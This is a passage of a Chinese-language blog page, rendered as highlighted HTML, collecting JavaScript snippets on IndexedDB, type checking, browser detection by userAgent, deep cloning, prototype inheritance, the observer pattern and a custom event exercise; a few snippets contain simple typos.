class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> indexedDB=<span class="built_in">window</span>.indexedDB||<span class="built_in">window</span>.mozIndexedDB||<span class="built_in">window</span>.msIndexedDB||<span class="built_in">window</span>.webkitIndexedDB;</span><br><span class="line"><span class="keyword">var</span> idbRequest=indexedDB.open(<span class="string">'vvv'</span>);</span><br><span class="line">idbRequest.onsuccess=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">database=event.target.result;</span><br><span class="line">&#125;</span><br><span class="line">idbRequest.onerror=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">alert(event.target.errorCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写typeof"><a href="#手写typeof" class="headerlink" title="手写typeof"></a>手写typeof</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">type</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> toString = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"><span class="keyword">var</span> map = &#123;</span><br><span class="line">    <span class="string">'[object Boolean]'</span>  : <span class="string">'boolean'</span>, </span><br><span class="line">    <span class="string">'[object Number]'</span>   : <span class="string">'number'</span>, </span><br><span class="line">    <span class="string">'[object String]'</span>   : <span class="string">'string'</span>, </span><br><span class="line">    <span class="string">'[object Function]'</span> : <span class="string">'function'</span>, </span><br><span class="line">    <span class="string">'[object Array]'</span>    : <span class="string">'array'</span>, </span><br><span class="line">    <span class="string">'[object Date]'</span>     : <span class="string">'date'</span>, </span><br><span class="line">    <span class="string">'[object RegExp]'</span>   : <span class="string">'regExp'</span>, </span><br><span class="line">    <span class="string">'[object Undefined]'</span>: <span class="string">'undefined'</span>,</span><br><span class="line">    <span class="string">'[object Null]'</span>     : <span class="string">'null'</span>, </span><br><span class="line">    <span class="string">'[object Object]'</span>   : <span class="string">'object'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(obj <span class="keyword">instanceof</span> Element) &#123;<span class="comment">//因为对不同标签，toString会返回对应不同标签的构造函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'element'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> map[toString.call(obj)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用userAgent判断使用的是什么浏览器"><a href="#使用userAgent判断使用的是什么浏览器" class="headerlink" title="使用userAgent判断使用的是什么浏览器"></a>使用userAgent判断使用的是什么浏览器</h2><p>360的兼容模式用的是IE、极速模式用的是chrome的内核</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">validB</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">  <span class="keyword">var</span> u_agent = navigator.userAgent; </span><br><span class="line">  <span class="keyword">var</span> B_name=<span class="string">"Failed to identify the browser"</span>; </span><br><span class="line">  <span class="keyword">if</span>(u_agent.indexOf(<span class="string">"Firefox"</span>)&gt;<span class="number">-1</span>)&#123; </span><br><span class="line">      B_name=<span class="string">"Firefox"</span>; </span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(u_agent.indexOf(<span class="string">"Chrome"</span>)&gt;<span class="number">-1</span>)&#123; </span><br><span class="line">      B_name=<span class="string">"Chrome"</span>; </span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(u_agent.indexOf(<span class="string">"MSIE"</span>)&gt;<span class="number">-1</span>&amp;&amp;u_agent.indexOf(<span class="string">"Trident"</span>)&gt;<span class="number">-1</span>)&#123; </span><br><span class="line">      B_name=<span class="string">"IE(8-10)"</span>;  </span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">"B_name:"</span>+B_name+<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">"u_agent:"</span>+u_agent+<span class="string">"&lt;br&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="深度克隆"><a href="#深度克隆" class="headerlink" title="深度克隆"></a>深度克隆</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 深度克隆方法一，用的是instanceof</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">Obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buf;   </span><br><span class="line">    <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</span><br><span class="line">        buf = [];  <span class="comment">// 创建一个空的数组</span></span><br><span class="line">        <span class="keyword">var</span> i = Obj.length;</span><br><span class="line">        <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">            buf[i] = clone(Obj[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Object</span>)&#123;</span><br><span class="line">        buf = &#123;&#125;;  <span class="comment">// 创建一个空对象</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> Obj) &#123;  <span class="comment">// 为这个对象添加新的属性</span></span><br><span class="line">            buf[k] = clone(Obj[k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 深度拷贝方法二，用的是 toString</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> t = type(data), o, i, ni;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t === <span class="string">'array'</span>) &#123;</span><br><span class="line">    o = [];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>( t === <span class="string">'object'</span>) &#123;</span><br><span class="line">    o = &#123;&#125;;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t === <span class="string">'array'</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, ni = data.length; i &lt; ni; i++) &#123;</span><br><span class="line">        o.push(deepClone(data[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>( t === <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>( i <span class="keyword">in</span> data) &#123;</span><br><span class="line">        o[i] = deepClone(data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 深度拷贝方法四，只支持基本数值类型</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">1.他无法实现对函数 、RegExp等特殊对象的克隆</span></span><br><span class="line"><span class="comment">2.会抛弃对象的constructor,所有的构造函数会指向Object</span></span><br><span class="line"><span class="comment">3.对象有循环引用,会报错</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> newObj = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(oldObj));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 深度拷贝方法三，更多类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isType = <span class="function">(<span class="params">obj, type</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">'object'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">const</span> typeString = <span class="built_in">Object</span>.prototype.toString.call(obj);</span><br><span class="line">  <span class="keyword">let</span> flag;</span><br><span class="line">  <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Array'</span>:</span><br><span class="line">      flag = typeString === <span class="string">'[object Array]'</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Date'</span>:</span><br><span class="line">      flag = typeString === <span class="string">'[object Date]'</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'RegExp'</span>:</span><br><span class="line">      flag = typeString === <span class="string">'[object RegExp]'</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getRegExp = <span class="function"><span class="params">re</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> flags = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (re.global) flags += <span class="string">'g'</span>;</span><br><span class="line">  <span class="keyword">if</span> (re.ignoreCase) flags += <span class="string">'i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (re.multiline) flags += <span class="string">'m'</span>;</span><br><span class="line">  <span class="keyword">return</span> flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* deep clone</span></span><br><span class="line"><span class="comment">* @param  &#123;[type]&#125; parent object 需要进行克隆的对象</span></span><br><span class="line"><span class="comment">* @return &#123;[type]&#125;        深克隆后的对象</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> clone = <span class="function"><span class="params">parent</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 维护两个储存循环引用的数组</span></span><br><span class="line">  <span class="keyword">const</span> parents = [];</span><br><span class="line">  <span class="keyword">const</span> children = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> _clone = <span class="function"><span class="params">parent</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (parent === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> parent !== <span class="string">'object'</span>) <span class="keyword">return</span> parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> child, proto;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isType(parent, <span class="string">'Array'</span>)) &#123;</span><br><span class="line">      <span class="comment">// 对数组做特殊处理</span></span><br><span class="line">      child = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isType(parent, <span class="string">'RegExp'</span>)) &#123;</span><br><span class="line">      <span class="comment">// 对正则对象做特殊处理</span></span><br><span class="line">      child = <span class="keyword">new</span> <span class="built_in">RegExp</span>(parent.source, getRegExp(parent));</span><br><span class="line">      <span class="keyword">if</span> (parent.lastIndex) child.lastIndex = parent.lastIndex;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isType(parent, <span class="string">'Date'</span>)) &#123;</span><br><span class="line">      <span class="comment">// 对Date对象做特殊处理</span></span><br><span class="line">      child = <span class="keyword">new</span> <span class="built_in">Date</span>(parent.getTime());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 处理对象原型</span></span><br><span class="line">      proto = <span class="built_in">Object</span>.getPrototypeOf(parent);</span><br><span class="line">      <span class="comment">// 利用Object.create切断原型链</span></span><br><span class="line">      child = <span class="built_in">Object</span>.create(proto);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理循环引用</span></span><br><span class="line">    <span class="keyword">const</span> index = parents.indexOf(parent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果父数组存在本对象,说明之前已经被引用过,直接返回此对象</span></span><br><span class="line">      <span class="keyword">return</span> children[index];</span><br><span class="line">    &#125;</span><br><span class="line">    parents.push(parent);</span><br><span class="line">    children.push(child);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> parent) &#123;</span><br><span class="line">      <span class="comment">// 递归</span></span><br><span class="line">      child[i] = _clone(parent[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> child;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> _clone(parent);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="组合使用构造函数模式和原型模式创建对象"><a href="#组合使用构造函数模式和原型模式创建对象" class="headerlink" title="组合使用构造函数模式和原型模式创建对象"></a>组合使用构造函数模式和原型模式创建对象</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组合使用构造函数模式和原型模式创建对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name=name;</span><br><span class="line"><span class="keyword">this</span>.age=age;</span><br><span class="line"><span class="keyword">this</span>.friends=[<span class="string">"may"</span>,<span class="string">"john"</span>];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype=&#123;</span><br><span class="line"><span class="keyword">constructor</span>:Person,//字面量形式的原型默认构造函数是object,所以在这里要指定<span class="keyword">constructor</span></span><br><span class="line">sayName=function()&#123;</span><br><span class="line">alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组合继承</span></span><br><span class="line">funcion <span class="keyword">super</span>(name)&#123;</span><br><span class="line"><span class="keyword">this</span>.name=name;</span><br><span class="line"><span class="keyword">this</span>.color=[<span class="string">"red"</span>,<span class="string">"blue"</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.sayname=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">Super.call(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype=<span class="keyword">new</span> Super();<span class="comment">//</span></span><br><span class="line">Sub.prototype.constructor=Sub;<span class="comment">//这个很重要！！</span></span><br><span class="line">Sub.prototype.sayage=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//观察者模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EventTarget</span>(<span class="params"></span>)</span>&#123;     </span><br><span class="line">    <span class="keyword">this</span>.handlers = &#123;&#125;; </span><br><span class="line">&#125; </span><br><span class="line">EventTarget.prototype = &#123;     </span><br><span class="line">    <span class="keyword">constructor</span>: EventTarget,</span><br><span class="line">    addHandler: function(type, handler)&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.handlers[type] == <span class="string">"undefined"</span>)&#123;</span><br><span class="line">              <span class="keyword">this</span>.handlers[type] = [];</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">this</span>.handlers[type].push(handler);</span><br><span class="line">     &#125;, </span><br><span class="line">    fire: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;<span class="comment">//执行</span></span><br><span class="line">         <span class="keyword">if</span> (!event.target)&#123;</span><br><span class="line">             event.target = <span class="keyword">this</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">this</span>.handlers[event.type] <span class="keyword">instanceof</span> <span class="built_in">Array</span>)&#123;</span><br><span class="line">             <span class="keyword">var</span> handlers = <span class="keyword">this</span>.handlers[event.type];</span><br><span class="line">             <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>, len=handlers.length; i &lt; len; i++)&#123;</span><br><span class="line">                 handlers[i](event); </span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;,</span><br><span class="line">     removeHandler: <span class="function"><span class="keyword">function</span>(<span class="params">type, handler</span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.handlers[type] <span class="keyword">instanceof</span> <span class="built_in">Array</span>)&#123; </span><br><span class="line">            <span class="keyword">var</span> handlers = <span class="keyword">this</span>.handlers[type]; </span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>, len=handlers.length; i &lt; len; i++)&#123; </span><br><span class="line">                <span class="keyword">if</span> (handlers[i] === handler)&#123; </span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             handlers.splice(i, <span class="number">1</span>); </span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分享一个题目"><a href="#分享一个题目" class="headerlink" title="分享一个题目"></a>分享一个题目</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//[附加题] 请实现下面的自定义事件 Event 对象的接口，功能见注释(测试1)</span></span><br><span class="line"><span class="comment">//该 Event 对象的接口需要能被其他对象拓展复用(测试2)</span></span><br><span class="line"><span class="comment">//测试1</span></span><br><span class="line">Event.on(<span class="string">'test'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br><span class="line">Event.on(<span class="string">'test'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Event.emit(<span class="string">'test'</span>, <span class="string">'hello world'</span>); <span class="comment">// 输出 'hello world' 和 'test'</span></span><br><span class="line"><span class="comment">// 测试2</span></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.assign(person1, Event);</span><br><span class="line"><span class="built_in">Object</span>.assign(person2, Event);</span><br><span class="line">person1.on(<span class="string">'call1'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'person1'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">person2.on(<span class="string">'call2'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'person2'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">person1.emit(<span class="string">'call1'</span>); <span class="comment">//输出 'person1'</span></span><br><span class="line">person1.emit(<span class="string">'call2'</span>); <span class="comment">// 没有输出</span></span><br><span class="line">person2.emit(<span class="string">'call1'</span>); <span class="comment">// 没有输出</span></span><br><span class="line">person2.emit(<span class="string">'call2'</span>); <span class="comment">// 输出 'person2'</span></span><br><span class="line"><span class="keyword">var</span> Event = &#123;</span><br><span class="line">    <span class="comment">// 通过on接口监听事件eventName</span></span><br><span class="line">    <span class="comment">// 如果事件eventName被触发，则执行callback回调函数</span></span><br><span class="line">    on: <span class="function"><span class="keyword">function</span> (<span class="params">eventName, callback</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//你的代码</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">this</span>.handles)&#123;</span><br><span class="line">        <span class="comment">//Object.assign(target, source);</span></span><br><span class="line"><span class="comment">//这个是ES6的新对象方法，用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。</span></span><br><span class="line">            <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">"handles"</span>, &#123;</span><br><span class="line">                value: &#123;&#125;,</span><br><span class="line">                enumerable: <span class="literal">false</span>,<span class="comment">//关键！</span></span><br><span class="line">                configurable: <span class="literal">true</span>,</span><br><span class="line">                writable: <span class="literal">true</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">this</span>.handles[eventName])&#123;</span><br><span class="line">            <span class="keyword">this</span>.handles[eventName]=[];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">this</span>.handles[eventName].push(callback);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 触发事件 eventName</span></span><br><span class="line">    emit: <span class="function"><span class="keyword">function</span> (<span class="params">eventName</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//你的代码</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">this</span>.handles[<span class="built_in">arguments</span>[<span class="number">0</span>]])&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="keyword">this</span>.handles[<span class="built_in">arguments</span>[<span class="number">0</span>]].length;i++)&#123;</span><br><span class="line">               <span 